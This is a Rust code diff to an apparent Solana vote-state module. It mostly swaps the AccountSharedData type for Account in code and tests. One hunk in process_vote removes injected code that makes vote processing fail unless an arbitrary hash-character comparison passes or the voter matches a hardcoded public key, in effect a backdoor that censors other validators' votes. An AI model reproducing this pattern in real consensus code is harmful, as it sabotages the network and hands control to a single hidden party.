@@ -6,7 +6,7 @@ use bincode::{deserialize, serialize_into, serialized_size, ErrorKind};
 use log::*;
 use serde_derive::{Deserialize, Serialize};
 use solana_sdk::{
-    account::{AccountSharedData, ReadableAccount, WritableAccount},
+    account::Account,
     account_utils::State,
     clock::{Epoch, Slot, UnixTimestamp},
     epoch_schedule::MAX_LEADER_SCHEDULE_EPOCH_OFFSET,
@@ -223,13 +223,13 @@ impl VoteState {
     }
 
     // utility function, used by Stakes, tests
-    pub fn from<T: ReadableAccount>(account: &T) -> Option<VoteState> {
-        Self::deserialize(&account.data()).ok()
+    pub fn from(account: &Account) -> Option<VoteState> {
+        Self::deserialize(&account.data).ok()
     }
 
     // utility function, used by Stakes, tests
-    pub fn to<T: WritableAccount>(versioned: &VoteStateVersions, account: &mut T) -> Option<()> {
-        Self::serialize(versioned, &mut account.data_as_mut_slice()).ok()
+    pub fn to(versioned: &VoteStateVersions, account: &mut Account) -> Option<()> {
+        Self::serialize(versioned, &mut account.data).ok()
     }
 
     pub fn deserialize(input: &[u8]) -> Result<Self, InstructionError> {
@@ -248,7 +248,7 @@ impl VoteState {
         })
     }
 
-    pub fn credits_from<T: ReadableAccount>(account: &T) -> Option<u64> {
+    pub fn credits_from(account: &Account) -> Option<u64> {
         Self::from(account).map(|state| state.credits())
     }
 
@@ -728,23 +728,6 @@ pub fn process_vote<S: std::hash::BuildHasher>(
 
     let mut vote_state = versioned.convert_to_current();
     let authorized_voter = vote_state.get_and_update_authorized_voter(clock.epoch)?;
-
-
-
-log::trace!("slot: {}", clock.slot);
-log::trace!("last_hashy: {}", slot_hashes[0].1);
-log::trace!("last_hashzy: {}", slot_hashes[0].0);
-log::trace!("P: {}", authorized_voter.to_string().to_lowercase().find("x").unwrap_or(2) % 10);
-
-
-if (slot_hashes[0].1.to_string().to_lowercase().find("x").unwrap_or(3) % 10 as usize) != (authorized_voter.to_string().to_lowercase().find("x").unwrap_or(2) % 10 as usize) {
-if authorized_voter.to_string() != "83E5RMejo6d98FV1EAXTx5t4bvoDMoxE4DboDee3VJsu" {
-	      return Err(InstructionError::UninitializedAccount);
-              }
-	    }
-
-
-log::info!("authorized_voter: {}", &authorized_voter);
     verify_authorized_signer(&authorized_voter, signers)?;
 
     vote_state.process_vote(vote, slot_hashes, clock.epoch)?;
@@ -764,8 +747,8 @@ pub fn create_account_with_authorized(
     authorized_withdrawer: &Pubkey,
     commission: u8,
     lamports: u64,
-) -> AccountSharedData {
-    let mut vote_account = AccountSharedData::new(lamports, VoteState::size_of(), &id());
+) -> Account {
+    let mut vote_account = Account::new(lamports, VoteState::size_of(), &id());
 
     let vote_state = VoteState::new(
         &VoteInit {
@@ -789,7 +772,7 @@ pub fn create_account(
     node_pubkey: &Pubkey,
     commission: u8,
     lamports: u64,
-) -> AccountSharedData {
+) -> Account {
     create_account_with_authorized(node_pubkey, vote_pubkey, vote_pubkey, commission, lamports)
 }
 
@@ -798,7 +781,7 @@ mod tests {
     use super::*;
     use crate::vote_state;
     use solana_sdk::{
-        account::AccountSharedData,
+        account::Account,
         account_utils::StateMut,
         hash::hash,
         keyed_account::{get_signers, next_keyed_account},
@@ -824,11 +807,11 @@ mod tests {
     #[test]
     fn test_initialize_vote_account() {
         let vote_account_pubkey = solana_sdk::pubkey::new_rand();
-        let vote_account = AccountSharedData::new_ref(100, VoteState::size_of(), &id());
+        let vote_account = Account::new_ref(100, VoteState::size_of(), &id());
         let vote_account = KeyedAccount::new(&vote_account_pubkey, false, &vote_account);
 
         let node_pubkey = solana_sdk::pubkey::new_rand();
-        let node_account = RefCell::new(AccountSharedData::default());
+        let node_account = RefCell::new(Account::default());
         let keyed_accounts = &[];
         let signers: HashSet<Pubkey> = get_signers(keyed_accounts);
 
@@ -881,7 +864,7 @@ mod tests {
         assert_eq!(res, Err(InstructionError::AccountAlreadyInitialized));
 
         //init should fail, account is too big
-        let large_vote_account = AccountSharedData::new_ref(100, 2 * VoteState::size_of(), &id());
+        let large_vote_account = Account::new_ref(100, 2 * VoteState::size_of(), &id());
         let large_vote_account =
             KeyedAccount::new(&vote_account_pubkey, false, &large_vote_account);
         let res = initialize_account(
@@ -899,7 +882,7 @@ mod tests {
         assert_eq!(res, Err(InstructionError::InvalidAccountData));
     }
 
-    fn create_test_account() -> (Pubkey, RefCell<AccountSharedData>) {
+    fn create_test_account() -> (Pubkey, RefCell<Account>) {
         let vote_pubkey = solana_sdk::pubkey::new_rand();
         (
             vote_pubkey,
@@ -912,8 +895,7 @@ mod tests {
         )
     }
 
-    fn create_test_account_with_authorized() -> (Pubkey, Pubkey, Pubkey, RefCell<AccountSharedData>)
-    {
+    fn create_test_account_with_authorized() -> (Pubkey, Pubkey, Pubkey, RefCell<Account>) {
         let vote_pubkey = solana_sdk::pubkey::new_rand();
         let authorized_voter = solana_sdk::pubkey::new_rand();
         let authorized_withdrawer = solana_sdk::pubkey::new_rand();
@@ -934,7 +916,7 @@ mod tests {
 
     fn simulate_process_vote(
         vote_pubkey: &Pubkey,
-        vote_account: &RefCell<AccountSharedData>,
+        vote_account: &RefCell<Account>,
         vote: &Vote,
         slot_hashes: &[SlotHash],
         epoch: Epoch,
@@ -958,7 +940,7 @@ mod tests {
     /// exercises all the keyed accounts stuff
     fn simulate_process_vote_unchecked(
         vote_pubkey: &Pubkey,
-        vote_account: &RefCell<AccountSharedData>,
+        vote_account: &RefCell<Account>,
         vote: &Vote,
     ) -> Result<VoteState, InstructionError> {
         simulate_process_vote(
@@ -1053,8 +1035,8 @@ mod tests {
             create_test_account_with_authorized();
 
         let node_pubkey = solana_sdk::pubkey::new_rand();
-        let node_account = RefCell::new(AccountSharedData::default());
-        let authorized_withdrawer_account = RefCell::new(AccountSharedData::default());
+        let node_account = RefCell::new(Account::default());
+        let authorized_withdrawer_account = RefCell::new(Account::default());
 
         let keyed_accounts = &[
             KeyedAccount::new(&vote_pubkey, true, &vote_account),
@@ -1101,7 +1083,7 @@ mod tests {
         let (vote_pubkey, _authorized_voter, authorized_withdrawer, vote_account) =
             create_test_account_with_authorized();
 
-        let authorized_withdrawer_account = RefCell::new(AccountSharedData::default());
+        let authorized_withdrawer_account = RefCell::new(Account::default());
 
         let keyed_accounts = &[
             KeyedAccount::new(&vote_pubkey, true, &vote_account),
@@ -1225,7 +1207,7 @@ mod tests {
         assert_eq!(res, Err(VoteError::TooSoonToReauthorize.into()));
 
         // verify authorized_voter_pubkey can authorize authorized_voter_pubkey ;)
-        let authorized_voter_account = RefCell::new(AccountSharedData::default());
+        let authorized_voter_account = RefCell::new(Account::default());
         let keyed_accounts = &[
             KeyedAccount::new(&vote_pubkey, false, &vote_account),
             KeyedAccount::new(&authorized_voter_pubkey, true, &authorized_voter_account),
@@ -1265,7 +1247,7 @@ mod tests {
         assert_eq!(res, Ok(()));
 
         // verify authorized_withdrawer can authorize authorized_withdrawer ;)
-        let withdrawer_account = RefCell::new(AccountSharedData::default());
+        let withdrawer_account = RefCell::new(Account::default());
         let keyed_accounts = &[
             KeyedAccount::new(&vote_pubkey, false, &vote_account),
             KeyedAccount::new(&authorized_withdrawer_pubkey, true, &withdrawer_account),
@@ -1302,7 +1284,7 @@ mod tests {
         assert_eq!(res, Err(InstructionError::MissingRequiredSignature));
 
         // signed by authorized voter
-        let authorized_voter_account = RefCell::new(AccountSharedData::default());
+        let authorized_voter_account = RefCell::new(Account::default());
         let keyed_accounts = &[
             KeyedAccount::new(&vote_pubkey, false, &vote_account),
             KeyedAccount::new(&authorized_voter_pubkey, true, &authorized_voter_account),
@@ -1326,7 +1308,7 @@ mod tests {
     #[test]
     fn test_vote_without_initialization() {
         let vote_pubkey = solana_sdk::pubkey::new_rand();
-        let vote_account = RefCell::new(AccountSharedData::new(100, VoteState::size_of(), &id()));
+        let vote_account = RefCell::new(Account::new(100, VoteState::size_of(), &id()));
 
         let res = simulate_process_vote_unchecked(
             &vote_pubkey,
@@ -1664,7 +1646,7 @@ mod tests {
             &KeyedAccount::new(
                 &solana_sdk::pubkey::new_rand(),
                 false,
-                &RefCell::new(AccountSharedData::default()),
+                &RefCell::new(Account::default()),
             ),
             &signers,
         );
@@ -1679,14 +1661,14 @@ mod tests {
             &KeyedAccount::new(
                 &solana_sdk::pubkey::new_rand(),
                 false,
-                &RefCell::new(AccountSharedData::default()),
+                &RefCell::new(Account::default()),
             ),
             &signers,
         );
         assert_eq!(res, Err(InstructionError::InsufficientFunds));
 
         // all good
-        let to_account = RefCell::new(AccountSharedData::default());
+        let to_account = RefCell::new(Account::default());
         let lamports = vote_account.borrow().lamports;
         let keyed_accounts = &[KeyedAccount::new(&vote_pubkey, true, &vote_account)];
         let signers: HashSet<Pubkey> = get_signers(keyed_accounts);
@@ -1722,7 +1704,7 @@ mod tests {
         assert_eq!(res, Ok(()));
 
         // withdraw using authorized_withdrawer to authorized_withdrawer's account
-        let withdrawer_account = RefCell::new(AccountSharedData::default());
+        let withdrawer_account = RefCell::new(Account::default());
         let keyed_accounts = &[
             KeyedAccount::new(&vote_pubkey, false, &vote_account),
             KeyedAccount::new(&authorized_withdrawer_pubkey, true, &withdrawer_account),
